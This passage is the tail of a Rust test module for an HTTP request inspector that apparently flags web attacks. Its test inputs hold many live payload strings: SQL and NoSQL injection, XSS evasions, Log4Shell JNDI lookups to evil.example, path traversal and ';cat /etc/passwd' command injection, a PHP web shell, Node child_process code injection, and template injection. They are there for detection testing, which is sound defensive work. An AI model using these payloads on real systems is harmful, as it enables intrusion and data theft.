        let ascii = "word ".repeat(10_000);
        let dense = "x".repeat(50_000);
        let multibyte = "Grüße, 日本語のテキスト。".repeat(2_000);
        for s in [ascii.as_str(), dense.as_str(), multibyte.as_str()] {
            let w = windows(s);
            assert!(w.len() > 1);
            let mut covered = 0;
            for win in &w {
                assert!(win.len() <= WINDOW && !win.is_empty());
                // byte offset of this window inside `s` (slices of `s`)
                let start = win.as_ptr() as usize - s.as_ptr() as usize;
                assert!(start <= covered, "gap before byte {start}");
                assert!(covered - start <= OVERLAP, "overlap {}", covered - start);
                covered = start + win.len();
            }
            assert_eq!(covered, s.len());
        }
        assert_eq!(windows("short"), vec!["short"]);
    }

    #[test]
    fn both_indicator_engines_find_the_same_matches() {
        let w = Inspector::new();
        let mut x: u64 = 42;
        let mut random = |len: usize| -> String {
            (0..len)
                .map(|_| {
                    x ^= x << 13;
                    x ^= x >> 7;
                    x ^= x << 17;
                    (b' ' + (x % 95) as u8) as char
                })
                .collect::<String>()
                .to_lowercase()
        };
        let mut values: Vec<String> = [
            "1' union select username,password from users--",
            "<img src=x onerror=alert(1)>",
            "${jndi:ldap://evil.example/a}",
            "../../../../etc/passwd",
            ";cat /etc/passwd",
            "{{7*7}}",
            "{\"$where\": \"sleep(100)\"}",
            "<?php system($_get['c']); ?>",
            "the quick brown fox jumps over the lazy dog",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        values.extend((0..20).map(|i| random(64 + i * 97)));
        for v in &values {
            for jndi_only in [false, true] {
                let mut set = w.indicator_matches(v, false, jndi_only);
                if jndi_only {
                    set.retain(|&i| w.jndi_only[i]);
                }
                assert_eq!(set, w.indicator_matches(v, true, jndi_only), "{v:?}");
            }
        }
    }

    #[test]
    fn too_many_values_are_flagged_not_skipped_silently() {
        let w = Inspector::new();
        let mut query = String::new();
        for i in 0..MAX_VALUES {
            use std::fmt::Write as _;
            let _ = write!(query, "a{i}=1&");
        }
        let target = format!("/?{query}x=%3Cscript%3Ealert(1)%3C%2Fscript%3E");
        let r = w.inspect(&HttpRequest {
            path_and_query: &target,
            headers: &[],
            content_type: None,
            body: b"",
        });
        let limit = r
            .findings
            .iter()
            .find(|f| f.indicators == ["inspection_limit"]);
        assert_eq!(limit.map(|f| f.score), Some(7.0));
        // under the limit nothing is flagged
        let r = w.inspect(&HttpRequest {
            path_and_query: "/?a=1&b=2",
            headers: &[],
            content_type: None,
            body: b"",
        });
        assert!(r.findings.is_empty());
    }

    #[test]
    fn multibyte_shell_argument_does_not_panic() {
        // used to slice a `&str` inside 'é' (`a[1..2]`) and panic the connection's task
        let w = Inspector::new();
        for v in [";cat -é", "a;id -ü", "x|cat -€"] {
            let _ = w.inspect_value("query:x", v, true);
        }
        let headers = vec![("user-agent".to_string(), "Mozilla;cat -é".to_string())];
        let _ = w.inspect(&HttpRequest {
            path_and_query: "/search?q=%3Bcat%20-%C3%A9",
            headers: &headers,
            content_type: None,
            body: b"",
        });
    }

    #[test]
    fn locations_and_body_types() {
        let w = Inspector::new();
        let headers = vec![
            ("User-Agent".to_string(), "Mozilla/5.0".to_string()),
            (
                "X-Api-Version".to_string(),
                "${jndi:ldap://x/a}".to_string(),
            ),
            (
                "Cookie".to_string(),
                "sid=abc; pref=%27%20OR%20%271%27%3D%271".to_string(),
            ),
        ];
        let body = br#"{"user": {"name": "<script>alert(1)</script>", "$where": "1"}}"#;
        let r = w.inspect(&HttpRequest {
            path_and_query: "/search?q=shoes&id=1%20UNION%20SELECT%201,2--",
            headers: &headers,
            content_type: Some("application/json"),
            body,
        });
        let locs: Vec<(&str, &str)> = r
            .findings
            .iter()
            .filter(|f| f.score >= 7.0)
            .map(|f| (f.location.as_str(), f.class.as_str()))
            .collect();
        assert!(locs.contains(&("query:id", "sql_injection")), "{locs:?}");
        assert!(
            locs.contains(&("header:x-api-version", "jndi_injection")),
            "{locs:?}"
        );
        assert!(locs.contains(&("cookie:pref", "sql_injection")), "{locs:?}");
        assert!(locs.contains(&("json.user.name", "xss")), "{locs:?}");
        assert!(
            locs.contains(&("json.user-key", "nosql_injection")),
            "{locs:?}"
        );
        assert!(!locs.iter().any(|(l, _)| *l == "query:q"));
    }

    #[test]
    fn server_side_code_injection_classes() {
        let w = Inspector::new();
        for (v, class) in [
            (
                "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()",
                "code_injection",
            ),
            (
                "#{require.main.constructor._load('child_process').spawn('id')}",
                "code_injection",
            ),
            (
                "this.constructor.constructor('return process')()",
                "code_injection",
            ),
            ("while(!false){}", "code_injection"),
            ("@{[system 'whoami']}", "code_injection"),
            (
                "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\"}",
                "code_injection",
            ),
            ("__proto__[isAdmin]", "prototype_pollution"),
            ("x.constructor.prototype.polluted", "prototype_pollution"),
            (
                "#set($c=$x.class.forName('a'+'b'))#set($m=$c.getMethod('ex'+'ec'))",
                "template_injection",
            ),
        ] {
            let f = w.inspect_value("query:x", v, false).expect(v);
            assert!(f.score >= 7.0, "{v}: {f:?}");
            assert_eq!(f.class.as_str(), class, "{v}: {f:?}");
        }
    }

    #[test]
    fn xss_evasions_are_blocked() {
        let w = Inspector::new();
        for v in [
            "＜script＞alert(1)＜/script＞",
            "\u{bc}script\u{be}alert(1)\u{bc}/script\u{be}",
            "ja&tab;vascript:alert(1)",
            "\"onzoom=alert(1)",
            "window[\"alert\"](window[\"document\"][\"cookie\"])",
            "[].sort.call`${alert}1337`",
            "!![]+[]",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            "<p style=\"background:url(javascript:alert(1))\">",
        ] {
            let f = w.inspect_value("query:q", v, false).expect(v);
            assert!(f.score >= 7.0, "{v}: {f:?}");
        }
        assert!(
            w.inspect_value("path", "/javascript-manual/document.cookie", false)
                .is_none_or(|f| f.score < 7.0)
        );
    }

    #[test]
    fn session_fixation_needs_missing_or_foreign_referer() {
        let w = Inspector::new();
        let run = |referer: Option<&str>| {
            let mut headers = vec![("Host".to_string(), "shop.example.com".to_string())];
            if let Some(r) = referer {
                headers.push(("Referer".to_string(), r.to_string()));
            }
            w.inspect(&HttpRequest {
                path_and_query: "/login.php?JSESSIONID=74B0CB414BD77D17",
                headers: &headers,
                content_type: None,
                body: b"",
            })
            .findings
            .iter()
            .any(|f| f.class == SessionFixation && f.score >= 7.0)
        };
        assert!(run(None));
        assert!(run(Some("http://attacker.example.net/x")));
        assert!(!run(Some("https://shop.example.com/cart")));
    }

    #[test]
    fn other_headers_only_checked_for_jndi() {
        let w = Inspector::new();
        let headers = vec![(
            "Accept".to_string(),
            "text/html,*/*;q=0.8' or '1'='1".to_string(),
        )];
        let r = w.inspect(&HttpRequest {
            path_and_query: "/",
            headers: &headers,
            content_type: None,
            body: b"",
        });
        assert!(r.findings.is_empty());
    }
}
